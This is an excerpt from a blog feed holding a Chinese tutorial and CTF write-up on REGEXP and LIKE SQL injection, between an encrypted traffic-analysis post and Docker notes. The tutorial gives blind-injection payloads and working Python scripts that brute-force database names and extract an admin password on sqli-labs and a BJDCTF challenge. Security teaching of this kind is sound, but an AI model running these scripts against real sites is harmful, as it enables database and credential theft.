4431bc76f452f4dbfd86f79b11a4ec18551b7b6148e184c626fb20503ecf9178b97a993fa28204a24cdc1a14a6a4c6bd840150748078705bef61d34a18286cd778b4420969173fa80b6f9fda5594e06910ca89e4f705caedf4de7ead03dabacccc6cf490f568ac7b24271879c781ea948aec747ec3318b5b3e5a3d7da6830d74dc3fd8e0414bf8e4c58d86fe24ba46c194929113ef2a87665c1e7f59863616b97a5a9f6dca53d3c10b57fa48e742c6a1f4668754b48077d29e05b2cd521ce22e68770929022ddae3ea795d77804da243dabbcf551dcfbca011e3890c2b065cd6e8b2d119e748400b3154db9f690c2a6512c3c50d5b26a52b7675026eb1919c4fb5900b58ac5053747734f5e95d114124023399064385d972fd74513430ec201b547eed44e953fb55711569c3f002556421f58cc85e031c314d9e2e96e2c98cdd261649a7d1bd35a5476f892cb26e9d0a1a5817e08533be5e5c179dbbed9164f062a0b02bb6ae1b604684bbdf2207ee1a3d9011e63b0a2384bc9a0ad4fb90e661fc8dfd3480aa9bc404d2aee41e8a40c3aa94805b7b45cccd08fd9e2ec1e1f8d03f1db4c4324e0e0e5c4c9f0486a4be7c4e127309d087f8cb80bde8a364c06b1db90104629d6381bf888532ef5e0efbc6c851bab39cf213bd86ad577c439c28c90d6b0746d298841f9b95cc05aca814c4652d10c1ece7229f79c7862316414358182124c6ff6ba89321c6a808376d271db42621c12f840cf80681b025887455b8f367d4d9a354fbd0189e6f9889f51daf1e1811b04093bd26d529efa8a707a521b66a44f48fe62b8acf60beb3e9b0856d5dd018c2bbba7d05d4458f2b569ec2b6467ae8f0b237c573727dcf7468d9bf1b5a3f77d0e6aaecc1a21ad98b10311fb4d7fe5915e9d98a975b6efbd257ca73d5caf0e8391f3b81976bdff5dbf6fbe027678170e8d3889a1f33aba317d5bc044a7c1c54e5e6f3de17e5d647621d6e62ba9853963b77c9adee08b94123c4f89d32e7fde3de127f9f939761b9879d18c612db44dc489254c6ef183e4dbc8b022c5359629d3b1130a55ea70ff627c911fe1bf6ed55191d53d35ddc315dc9817e2424a5c1747396efac2d5a947780bab6155474fc7623c570e52ca4c43d9786d99fc23ed2aa354476df465b456727873aab038c4ba099b8605de05dc2adfe77c00015833476f41f2b87a1dba967efedac7a1d7829d521eb057a21f12140d35d99e7c8f5df948faaea56d5ff4e528cdc704f0e6339398fd71970b12143d24382d63024749124ab50318b577048fad6a47ce8dfa6ce90ad22b633edc32dd698a1895cd1fe16d0e9c82f4ad36b6e73c3c1cfd07c1a7c5881e01e14338336edbaa5142a5f2beabeee6969a62c60eee470fc3157f91098e34e2bb967dfdbba420181a85835e1bbed0b9fc5c5053151a69a530845aa2d03ab11b90048e080c3112a3aa4737b02b12f72f2643a2ead5c86b483a613b83f9c7d3fad776f8a7297f42f615f3f8833b8fabe9758178a4da6873b1256e25306b02e51537beb9f538872575931ebf50afb9a954f83b64553753f626aa301a5e0522148293fe074a79e5b4626ed502a07b12557df5f9b28c4c37b84306f5f114d710de60403fd1430364260998ed9c8bfd5dc1746843ad3bc526bd275fca71201f44e2f4f47b66e7f62bdac1cf3787de6c3c81bab6591e26a1e249ef4886b678bb442b75ec6c564813b749bc39432910312311f475055215cffb89e81b24c57fdd05bada3e4f1f962e7c34a27a87d982830ba6e5d0c048e1d680b5340594e3a79de7b3f470998bf08e5c36ffe4d479330736b08f35a3411d570ce52eb0ade31b04d2d89058196b255663adca3b5b9549055ad4b0d3e553f7766aaf075252cd025e57acc217ad72e44ddf082576f29125466346bb5770acf7d0dcc7470fd437e58afdc5ad64f994794613640127798c30be4aa84efcda24396f4c25c6aa8d21618c9bef86d69c97bb0037fc7ab922f6ade9518896b51f613e9322cae4a54b272c3c47672bbf597905385bb172430366a09f9832a5a9721558e7336e0f95a36993c2fdc80e4361da3025a3227eca6f590d859e097f4effa155fad019ccbf45c607d71c7fd3e10102bf772c5ee2c950c5fba48059dceb02c3dcd0b14b4266e6c320ebd858b8920867e428d55b0d3bd5c1b3cf966bfc072aab24357c489ea0fba9f118231f32ba60ca130d5a3af6b0fa131dbbab825ecd120698524c0230cea30d246b3769dd89242fe46f404c67610480ba7ba31afa0e3ebf2a9f8d6afc2bc11985832459f9db8ed6af85f166f077fa62c362987c434901cc448eb3d9ba659d6c818b4d01e5148df542dedfa7dd203bfc3bdc8d316fea4a01a85d34e2eeabf65d436acaac084da3cc73e0f8e1082c1e9ef241cdaf8b8e3e0ff1b7a648de82fc625d271b0c441666877dc2f94ed77216945d3dfbc8ec0af4d61493945cbdd657e94f2d1302a0dc596b6e6340b4df2b410ce64ce6ce60067c2951604a468b45c7c0cd6345af3541b6560e54923af702451637e9408474a14ec39f8c1ec250ab9de291403619db4e5b1ba59bcb22e6c064e51e6e8d07e65baec9bdc302960a43babeceb2d3cbbef6f0f9ec38378c19ea2a54a9987632fc7c6ee1a3ca3aee82aaf2bc7048a3196a3ba0f93e08edba2fe82a32ec705ba59f83c6dc9bdf9d21b770c2f2208af3555e7bdf9a760443b93aabc3da892b96e604595faaf81b1b2ae18018bcf208322216af0b155fdfae9f10ee85a75601f25c6f75daf6e7339856cd05be563584f8bf562b3f24f9afbf0b4230f3b1b698b6db75badd2390a0d877fce6e76d3601ef55cfb4dda1897f604b91065727629f86f617b37932a967c2e1e5d6a660d5df712167d48abdee5e00890c082074b485a1e5468217057d849ec90ee2d1d14a8356cb5251df13fa2f109e59b034a4dba3713d8ef6786bdbcf00356309c97c1bdf546ceb68658cad3e94c5f0a11f285e8b896610df3d1718dcebfd5f1d0f6ecda338499c6d98286f1c4734242f5ccecc036e438a7fb5624005a43edc62894b0dd01e3583e2a97484b87416e9769dd6c076d56f1bd3a0730d0de7553bf92f198e826048d2da6f6b57baaed55ebd68c78333781267ecb4ffa4764efa5a015fa4cbfc1eda8b4a2ad8ffdee48aad084bc8c447fd4a4e50e8766db3d98bda2e106446876d7d018181420e6e1be6f5f2ba0e7240fb36769e76b25929e08b106bc4cf79a792fcfd154ae7e2e0167a786d5c9f4d97973eb9b923d3a01da7ea2aefccb43d1f0f44107c694a7aa974db431759f2a3249c9e3bd03008d602bbdef58f664390b39eeb2b87554403c6fb5fe78a8e6e2e6b0e8bf3485513479a2036d10d19fa36a06785eaa2b5646b5a52ba30f5d9a1e108ddedb1e2b414b2b39d69948973b11609e03da2eb958e4b7f0fa2b85aaa47d898afb31e9d242285994e627e27a21a5d68efff5665a1afa01a40ec74f2f1ace7df6b466015f61931ea7856d08e3eddc2979e5e6f8127cfecadf6e553fb986a7e2c7d5f81f29dc2ebfaede883209aefb43d11f36f4a7badc6d195cb30a9712f6d4e1f654372f6d5920d406674d9e2104092f322e74c8f0010127f64117ba56260fd1c44f014a026b3beee89463ee6bcd8a3c26e1be31162f94faf7cde5d77965691a046661ff1972301ee7c915f29057fa335217a39abe03143316352d66c75f8b746bceb8ef4e0eec45dd0f5454403fb85198023f127e741264f90da5ac72069658907981d4a36c0d9a013a2069fbb77fa6199bbb6c3df4bd0d903dbc190ced60c954178183ee7c4f5f3b41ea9decd693019d6d194d0f6f4ccf0e489740b3d798db04d907b286c6c9ea27e14840e91385e165470883d9e99f8df0ddadf72bf59f085721a5ae9cd64ff7de38c0f2e6c68c7f259110bd1499da592ecbea004767281cd5ca6232227af55f5da2043c1236f5a495c5d979423be2fe717f53dc9516ca058a1146ecf2a0239c189863ce40d68da4f0b4f812b51bfbfd5dac5c5c79c2cbd08376c0f6290c84d72ada5189f3eac8166f5c0932778c72e19250e129406efbfb30f29d8ef898786b2bfd21eebd856846ff1d6fca7138f8a69a8aa1bc1d25e07b91965bebe2960ec519b283eb85ccd2c1f92456727820fbcdf70e3cd6bc8de93254e2ddda7e6ff7c3c4fea7a6e74d4d18959366638a329d7a4cb9b4ef37715d817e416a2ec1f51304a11efc3acf409bddc45a2fb058845a50936ed3403cb8aa2ae932a2f0b669695c07a0ab135d91da2e092c4fc578cd31d71dc55d7039337143f88822c629fbde2816bdb67911e75ec3468a2617baa3a8bf20e4782b8a65395888cccb5cbe635dcea3cee89b3333abca3d3dabb9137a838ae1708ed9a57d8bdc0351e0568bcd25f13c0af6880077c04dddbe0f848fd0490e12c14e4729208ca6bc3a101b0a22466ffe2af0f5ddb0aa237f9e4bb4669b0e11b8367f2c0fe16c665767a4bed54b9e2e81344a55c50f267ccad7b9a95e111e0aff109e0c5b25ca53313b4c590aa6aa1e9b6f87039631a47b41ecbdead141d092672f02aa14093b7ad083969ed936ac04ce4d9a7fc50aecddab78131dad95778444ce2278fc86b4af7088f59533bd62f1a15aca225c473b0d3bb53455c2d57e90f93878780412fee5bceae20e9d764f04da0d088894585e3cbb46b983e6c9062738549e6add7041d75e48be604f8cf6264cb101d09e24a9533816ac0a0c1bcc8856bd7a2a2c56200db614f50558e5f0c8b32fd8c9e376e58ab873918682014611d576bce272781a454048da09d3df9657e036766482dde79a81640baeb02b555b465cad5f308b754bec751179c14731238f4a9aacab71713841741bcc5c00bb21fbdcbaa7f11b2ff329b3918f8b3c098a49bec2e2f45de432922efd1a4ae4993c7aa002feaf081d80f2cd1588a9880e7c897b05c0787c08398f164ff236612a9b896d055dea77ca1e3ae064b813edc3af891ccbd2ef6bb48fcd58cbc0557efd563eb31ebfeca0a8e948363be8ae157380c8b9e23a777d838a4806406c50a5c9ab868c0067d24f58f5a0c38a8931740ffe6aac052b53a9e754121e27f766cc931d41cbe1c93f88dd70a4507ff0e647839f824836f9c1014438ce2bf79bc9c2ca3ff2191c8aa4e8bee383d4e9b2c01579aa374a372b93e276e022e86ced7bc99f53446d282cf70de1ae0d894bd64a51624ac407ea611d636c055aed6442ef30a36e974091c06f8802a47ce57518a55d29c69b2feba4df91c0698de1623c4a83a61f11fd82b9919c14aea4ca89889ebe23f971be6c9034eb4d49b2804f92966fb73666afef8a43e9d57f75d45a5cac1a216a3b08c60abe17081680b5a257243e5bbd124431b176f1236a3ba101934ad7ccc2b6be5c2f5ecbe6a1f4ba9b52ec03d26375344a78d98a953810ace095830428e7f2a4f28221e5347cffca3fb49bac9f9366a8d43a05b0e16f0118c942bcd4ebf0f433d6648525682c3148150e293e61810956440ff70f8657afa2e4a631db3f99d5441d416d809fb95e93357a06b051af90c2cbf855cc240a1ea1eea8e4bcb093f6bfe22c185c07183beb4f012269c2f6a526d72af162d750b0e3c6754b534a6bef4dbb369f86db600f1b2ad1c7009272ec724be01057825b9e85a242e0aa0f8ebf1ed823439633b2b83be08c1780b034cee7a94d2b870fa1438432fa49a02c8e71c387a8d28fe2fc31eb2a714ea2c56c09c0af811a5c2b68d2feb0ab2999950336b5f8add138d6994358a1df0e88e055d477b829094abe463d3ee9bbbe44074ea4ebdb679e6a331823fecb8d3ba5b0404578d41e01b6921f333ed8f45afd6b22106336bc26b454c1ed5d4ffc684eecd2c6f286eed38b5f47893aeb3e4a7d2301315eae16da0e12d38c0049cad78d41559c81db5301d1fca310358a36004b5f880ce441fc6b7c5e59402b9045991c5037a3013e655f9d8f72f3aa758a99d02be1743125c52afaa64271b15a8199fb9c26cefa692d4378c4a874574c2cb95726ecd86fd69ad3f60250fbb80702e4525131531796efdd7d63d839138660fdd09e7aa4694e8593dbdd22b99649257a9ad4f0fb28cd137abb1aa4b3105495a55466c7f3d44f05e26664eccfae6cc1f5d9f63faa8bc31941cece0fa6eab1e75c9fac026fa7eb890232ad9fc5e89e9364bbd16d50a840e8feb6b0f754cda42609e07be49d4fc230508aa07da40f2a683cd262b232f4477cef387ce7141c2c1c66742a989a7c2174287456800e95f9391c3454d7d15b219d96c1104a72c70b14d9c20d93bb3876a05d03605cd0e2b1f77613f7e5f30d7d09c075d8859f9c985f35af63b9d44a622f68481b5aa44911f3c9bb230e7154fafcf9d0df53b24d5219c8ca884b8bbaf6e78783b0b68bc0e03d9cbfae74bf6b7bc6d23be18674924b00aac156a9ad5c704831a4c326038385d471ea6a7ae399a6008d59cd4213cf0d156d43d4b41285fc9dfbf66ba09cd0535adb97fc0d4c86eca7e89452845048b28acd32f341c5cba2236ff0af67366dd63c5a9b7676e24b82eb39a75e1d63a0b4ffaa5052eb80b82a221ef3ec2546e5fe5f01e0494df1cf11e3f66bde11939bceb3091c97e911d896b191d758bae28342a9a37dce80fc36743efe957dce3fa4b630d1ad4830855a03cfc7b751b3f32da0d19c2ffb0424408cf6df78d46a2f4069273b6679a24089ba4f1e7c74df2c2d977e91fa9cb30deab7b93b5357b1a9a69da542993b0bbbed33c1e7c092ade5652679d515e61826eb786fa31715eb4a051bd84a6ff3be6be7555d81a0e51bdf7577dda12e62543ab2e28901dc386127426e27fff7eee4cbb272c0d1161f7985d80ae774a405be5ccff9d427a814d331f43dedffb04935244ff250f92c2ecc38213ee3ee6ec86a16984155533c16eb9aba66b975a7c596c64e36d006d950748a11f84431a91b18e728e836c89379fa77040e2f97e0ebc9a4e40a13c6399abd6e582242a9baea3f39c916d12a9f77d44bab9ccd48950268708651546f175834087d3c8870b37c4f51fa00043564c5bc19500e4ed6982e9e13680c2ba6d0d4bbfa8c6dc88e9a0cbc711d14d9d015d33da3d6e2a82345613047f3e1e0a075daa3a5361aa1406cd0faf6e06053ca990aeb2770004c0e9830a049925904fcab39ab5fa955c43760a6cedb85ac0f5a5e2372bf573b39302c9078888040f3a6b0343b63bff0fc9cf04dd75be63c53fb7fa5e41cfdecc194135a81f8e64a440dbcc16ea643b9a0cf77bc3d30a6ffba58e56eb1b97d552751995127bd7bbf78f4df4e336f1926d601cf90d2a8312d431cc149eae8480c1846b3fb42b2662c4032eb0464cdf759fc779827a29407682c5d9baece04ae45ffb6e1f5240e32deff12e941d58f87b7fd3a90f164aa424188526c3495c2431e81c5847e45f4dd2c6185e7158d965d56147951328ada8339e7697bf9259adbb5966eb6290acb682a3222e806c54cf3b916c7672650b5c6462f8d8527bef963ee36661e5afe118da8f2c934ca296f37b8af42cd7bf188227b4e394a9f8616c70cb8b19fdd8db48ebf39bb4f7987233e4477120af7ac4371c57f68d6c80764ee4201e3b428a3852d38824059a94385ceb60a32ce2d5886bb61b323a589614761eac490de7cb58cb4613b09cd6fedd0c7b1f37fdd7c9be1e2e419840f97218d0d16cc78b6eed429e6e3f86a28270e77415128f90730ecf1faefc1d436315f3a869ad2bd1d8d515dabbc9ad324f847bb44ebfc933fc13f4558943dba018c266bb7dfeef1eb75ca33adb2b9875721a4df5c5aae36fb301c892f4e4cfb01f3238b9dd3e4759ee6818570c8315ac58cea42ef6e037fd753cb323ef5def695f844aa2a8867cf09e07454fa70e61af4f0b67677fedca4bd3f8c4aa663e57d55e70a7528043738198a1c9314be329ff75ef8c47d9aff3315d3965a35c602990bd43b3130fdcd2b908a4258d47927e4b645c5258f6d81174603d625e2853521c0906c5dc858b992d04b51aa293531ba5c6c768d1778dae272497366cd59db6da10fea2a9fae6b794cbdf5e28fa670e4049032c270a58113d5e3634afad257ca354c5ee6e04e38af86921a226ec60bc102844833649af182223caaf098927e22be9fe7d6a38a1cc4142bda9d9dedb64ab</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> Wireshark使用 </tag>
            
            <tag> 流量包修复 </tag>
            
            <tag> Web流量包分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>REGEXP注入与LIKE注入简单学习</title>
      <link href="/2020/07/23/REGEXP%E6%B3%A8%E5%85%A5%E4%B8%8ELIKE%E6%B3%A8%E5%85%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/23/REGEXP%E6%B3%A8%E5%85%A5%E4%B8%8ELIKE%E6%B3%A8%E5%85%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>首发于先知社区</strong></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前已经学过SQL盲注了，也见过盲注中REGEXP注入，但没详细了解过。正好这次BJD遇到了这个，简单总结，并把题目复现一下。</p><h2 id="0x01-REGEXP注入分析"><a href="#0x01-REGEXP注入分析" class="headerlink" title="0x01 REGEXP注入分析"></a>0x01 REGEXP注入分析</h2><p><strong>注入原理</strong><br>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。<br>应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><h3 id="1、基本注入"><a href="#1、基本注入" class="headerlink" title="1、基本注入"></a>1、基本注入</h3><pre><code class="sql">select (select语句) regexp &#39;正则&#39;</code></pre><p>正常的查询语句：</p><pre><code class="sql">select username from users where id=1;</code></pre><p>（1）正则注入，若匹配则返回1，不匹配返回0</p><pre><code class="sql">select (select username from users where id=1) regexp &#39;^a&#39;;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200330004820823.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0<br>（2）regexp关键字还可以代替where条件里的=号</p><pre><code class="sql">select * from users where password regexp &#39;^ad&#39;;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200330004837786.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用场景：</p><blockquote><p>过滤了=、in、like</p></blockquote><p><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配</p><p>常用regexp正则语句：</p><pre><code class="sql">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中regexp &#39;^r&#39;      #判断第一个字符串是否为rregexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中</code></pre><p>（3）在联合查询中的使用</p><pre><code class="sql">1 union select 1,database() regexp &#39;^s&#39;,3--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20200330010555900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2、REGEXP盲注"><a href="#2、REGEXP盲注" class="headerlink" title="2、REGEXP盲注"></a>2、REGEXP盲注</h3><p>在sqli-labs靶场Less-8关进行测试<br><strong>1.判断数据库长度</strong></p><pre><code class="sql">&#39; or (length(database())=8)--+ 正常</code></pre><p><strong>2.判断数据库名</strong></p><pre><code class="sql">&#39; or database() regexp &#39;^s&#39;--+ 正常&#39; or database() regexp &#39;y$&#39;--+ 正常</code></pre><p>表名、字段名、数据内容参考以前总结。<br>很明显和普通的布尔盲注差不多，于是写个脚本：</p><pre><code class="py">import requestsimport stringstrs = string.printableurl = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot;database1 = &quot;&#39; or database() regexp &#39;^{}&#39;--+&quot;table1 = &quot;&#39; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^{}&#39;--+&quot;cloumn1 = &quot;&#39; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) regexp &#39;^{}&#39;--+&quot;data1 = &quot;&#39; or (select username from users limit 0,1) regexp &#39;^{}&#39;--+&quot;payload = database1if __name__ == &quot;__main__&quot;:    name = &#39;&#39;    for i in range(1,40):        char = &#39;&#39;        for j in strs:            payloads = payload.format(name+j)            urls = url+payloads            r = requests.get(urls)            if &quot;You are in&quot; in r.text:                name += j                print(j,end=&#39;&#39;)                char = j                break        if char ==&#39;#&#39;:            break</code></pre><h2 id="0x02-LIKE注入分析"><a href="#0x02-LIKE注入分析" class="headerlink" title="0x02 LIKE注入分析"></a>0x02 LIKE注入分析</h2><p><strong>like匹配</strong><br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p><h3 id="1、基本注入-1"><a href="#1、基本注入-1" class="headerlink" title="1、基本注入"></a>1、基本注入</h3><p><strong>1.<code>like &#39;s%&#39;</code>判断第一个字符是否为s</strong></p><pre><code class="sql">1 union select 1,database() like &#39;s%&#39;,3 --+</code></pre><p><strong>2.<code>like &#39;se%&#39;</code>判断前面两个字符串是否为se</strong></p><pre><code class="sql">1 union select 1,database() like &#39;se%&#39;,3 --+</code></pre><p><strong>3.<code>like &#39;%sq%&#39;</code> 判断是否包含se两个字符串</strong></p><pre><code class="sql">1 union select 1,database() like &#39;%se%&#39;,3 --+</code></pre><p>4.<code>like &#39;_____&#39;</code>判断是否为5个字符</p><pre><code class="sql">1 union select 1,database() like &#39;_____&#39;,3 --+</code></pre><p>5.<code>like &#39;s____&#39;</code> 判断第一个字符是否为s</p><pre><code class="sql">1 union select 1,database() like &#39;s____&#39;,3 --+</code></pre><h3 id="2、LIKE盲注"><a href="#2、LIKE盲注" class="headerlink" title="2、LIKE盲注"></a>2、LIKE盲注</h3><p>依旧在sqli-labs靶场Less-8关进行测试<br><strong>1.判断数据库长度</strong><br>可用length()函数，也可用<code>_</code>，如：</p><pre><code class="sql">&#39; or database() like &#39;________&#39;--+</code></pre><p><strong>2.判断数据库名</strong></p><pre><code class="sql">&#39; or database() like &#39;s%&#39;--+也可用&#39; or database() like &#39;s_______&#39;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401003653904.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明数据库名的第一个字符是s。数据表、字段、数据类似<br>我又把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本：</p><pre><code class="python">import requestsimport stringstrs = string.printableurl = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot;database1 = &quot;&#39; or database() like &#39;{}%&#39;--+&quot;table1 = &quot;&#39; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;{}%&#39;--+&quot;cloumn1 = &quot;&#39; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) like &#39;{}%&#39;--+&quot;data1 = &quot;&#39; or (select username from users limit 0,1) like &#39;{}%&#39;--+&quot;payload = database1if __name__ == &quot;__main__&quot;:    name = &#39;&#39;    for i in range(1,40):        char = &#39;&#39;        for j in strs:            payloads = payload.format(name+j)            urls = url+payloads            r = requests.get(urls)            if &quot;You are in&quot; in r.text:                name += j                print(j,end=&#39;&#39;)                char = j                break        if char ==&#39;#&#39;:            break</code></pre><p><img src="http://img-blog.csdnimg.cn/20200401010444221.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆出数据库名<code>security</code></p><h2 id="0x03-REGEXP注入实战"><a href="#0x03-REGEXP注入实战" class="headerlink" title="0x03 REGEXP注入实战"></a>0x03 REGEXP注入实战</h2><p>学完REGEXP注入和LIKE注入后，是时候把BJD的<code>简单注入</code>那道题复现一下了。BJD CTF的<code>简单注入</code>主要涉及的是REGEXP盲注。开始复现：<br>先fuzz一波，发现：</p><blockquote><p>单引号 双引号都被ban了<br>union和select都被ban了<br>=和like被ban了</p></blockquote><p>似乎没得思路了，看下wp，发现<code>SQL语句逃逸单引号</code>,于是了解一下这个方法。<br><strong>SQL语句逃逸单引号</strong><br>主要是通过反斜线<code>\</code>，将单引号转义，从而实现了SQL语句逃逸，造成SQL注入。<br>意思就是：<br>假设sql语句为：</p><pre><code class="sql">select username,password from users where username=&#39;$user&#39; and password=&#39;$pwd&#39;</code></pre><p>假设输入的用户名是<code>admin\</code>，密码输入的是<code>or 1#</code>整个SQL语句变成了</p><pre><code class="sql">select username,password from users where username=&#39;admin\&#39; and password=&#39; or 1#&#39;</code></pre><p>由于单引号被转义，<code>and password=</code>这部分都成了username的一部分，即</p><pre><code class="sql">username=&#39;admin\&#39; and password=&#39;</code></pre><p>这样<code>or 1</code>就逃逸出来了，由此可控，可作为注入点。</p><p>而fuzz结果，确实发现反斜线没有被ban掉。<br><img src="http://img-blog.csdnimg.cn/20200401014222787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是就可以注入了<br><img src="http://img-blog.csdnimg.cn/20200401015729653.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后发现这个地方会有变化。大师傅的wp上说用这个注不出登录密码，可以用REGEXP进行注入，并且还说要加上<code>binary</code>关键字区分大小写。好了，先不看大师傅的脚本，自己把上边的脚本改一下，试试。<br>试过后发现跑不出来。。。。看下wp，发现要转换16进制(16进制在数据库执行查询时又默认转换成字符串)，好吧。再改写下，最终成品如下：</p><pre><code class="python">import requestsimport stringdef str2hex(string):  result = &#39;&#39;  for i in string:    result += hex(ord(i))  result = result.replace(&#39;0x&#39;,&#39;&#39;)  return &#39;0x&#39;+resultstrs = string.ascii_letters+string.digitsurl = &quot;http://3fb55301-c0be-4134-830b-fda52f321221.node3.buuoj.cn/&quot;headers = {    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&#39;}payload = &#39;or password regexp binary {}#&#39;if __name__ == &quot;__main__&quot;:    name = &#39;&#39;    for i in range(1,40):        for j in strs:            passwd = str2hex(&#39;^&#39;+name+j)            payloads = payload.format(passwd)            postdata={                &#39;username&#39;:&#39;admin\\&#39;,                &#39;password&#39;:payloads            }            r = requests.post(url,data=postdata,headers=headers)            if &quot;BJD need&quot; in r.text:                name += j                print(j,end=&#39;&#39;)                break</code></pre><p>跑出了用户密码<br><img src="http://img-blog.csdnimg.cn/20200401025806951.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录即可得到flag。。。复现完毕。</p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>学习了<code>REGEXP注入</code>和<code>LIKE注入</code>，了解了<code>SQL语句逃逸单引号</code>以及<code>16进制在数据库执行</code><br>继续努力！！</p><p>参考博客：<br><a href="https://xz.aliyun.com/t/5356" target="_blank" rel="noopener">从CTF题中学习几种有趣(奇怪)的SQL注入</a><br><a href="https://www.anquanke.com/post/id/160584" target="_blank" rel="noopener">CTF中几种通用的sql盲注手法和注入的一些tips</a><br><a href="https://smelond.com/2018/04/04/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB/#regexp%E6%AD%A3%E5%88%99" target="_blank" rel="noopener">sql注入之盲注攻击</a><br><a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">第二届BJDCTF 2020 全部WEB题目 Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REGEXP注入 </tag>
            
            <tag> LIKE注入 </tag>
            
            <tag> 题目复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记(二)-常用操作、数据管理</title>
      <link href="/2020/07/12/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E3%80%81%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86/"/>
      <url>/2020/07/12/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E3%80%81%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>docker已经学过一部分了，继续学习下面的部分</p><h2 id="0x01-docker常用操作"><a href="#0x01-docker常用操作" class="headerlink" title="0x01 docker常用操作"></a>0x01 docker常用操作</h2><p>之前已经学习了容器操作和镜像操作等，但其中常见操作不太方便看<br>于是这里先归纳之前所学的常用操作并加以补充：</p><h3 id="1、镜像的操作"><a href="#1、镜像的操作" class="headerlink" title="1、镜像的操作"></a>1、镜像的操作</h3><pre><code class="shell">docker search 镜像名 #查询镜像docker history 镜像名 #查询历史镜像docker pull 镜像名[:tag] #拉取镜像到本地docker images #查看本地全部镜像docker rmi 镜像id #删除本地镜像，id可以只写前几位docker save -o 导出的路径 镜像id #将本地镜像导出docker load -i 镜像文件 #加载本地镜像文件docker tag 镜像id 镜像名:版本 #修改镜像名称#镜像文件加载后，镜像的REPOSITORY和TAG为none。通过此命令，REPOSITORY为镜像名，TAG为版本docker commit -a &#39;镜像作者&#39; -m &#39;镜像构建信息&#39; 容器名/容器id 构建镜像名#通过容器构建镜像，-p不暂停正在运行的容器docker build -t=&#39;镜像名&#39; . #通过Dockerfile文件构建镜像。先创建Dockerfile文件，然后执行命令构建docker push 镜像名[:tag] #推送镜像</code></pre><h3 id="2、容器的操作"><a href="#2、容器的操作" class="headerlink" title="2、容器的操作"></a>2、容器的操作</h3><pre><code class="shell">#运行容器，简单操作docker run 镜像id/镜像名[:tag]#运行守护式容器docker run -d -p 宿主机端口:容器端口 -v 宿主机目录:容器目录 --name 容器名称 